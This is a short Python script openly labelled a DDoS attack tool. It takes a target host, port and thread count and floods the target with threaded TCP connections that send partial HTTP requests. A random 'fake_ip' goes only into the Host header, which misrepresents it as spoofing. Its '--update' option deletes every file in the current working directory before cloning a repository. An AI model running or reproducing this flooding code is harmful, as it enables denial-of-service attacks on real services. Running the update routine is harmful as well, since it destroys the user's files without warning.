import os
import argparse
import socket
import threading
import random
import struct
import re
from git import Repo

parser = argparse.ArgumentParser(description ='***DDoS attack script by python***')

parser.add_argument('-u', type=str, help="Target Url")
parser.add_argument('-p', type=int, help="Target Port")
parser.add_argument('-t', type=int, help="Number of Threads [Attack Level]")
parser.add_argument('--update', nargs='?', const='', help="Update the script to latest vertion")
args = parser.parse_args()


if args.u != None and args.p != None and args.t != None:
  host = args.u
  pattern = re.compile(r"^w{3}\..+\..+$")
  matches = re.findall(pattern, host)
  if len(matches) == 0:
    raise Exception('Could not connect to target address!')
  else:
    port = args.p
    threadNum = args.t
    num = 0
    def attack():
      while True:
        fake_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((host, port))
          s.sendto((f"GET /{host} HTTP/1.1\r\n").encode('ascii'), (host, port))
          s.sendto((f"Host: {fake_ip}\r\n\r\n").encode('ascii'), (host, port))
          s.close()
          global num
          num +=1
          print(f'{num}. voly sent!')
        except:
          raise Exception('Could not connect to target address!')
          exit(-1)
  for i in range(threadNum):
    t = threading.Thread(target=attack)
    t.start()

elif args.update != None and args.u == None and args.p == None and args.t == None:
  print('Updating to latest vertion....')
  dir = os.getcwd()
  for f in os.listdir(dir):
    os.remove(os.path.join(dir, f))
  Repo.clone_from("https://github.com/HasanAshab/XerXes", "../../../XerXes")
  print('Done!\n')
else:
  raise Exception("Invalid input!\ntry -h for help\n")
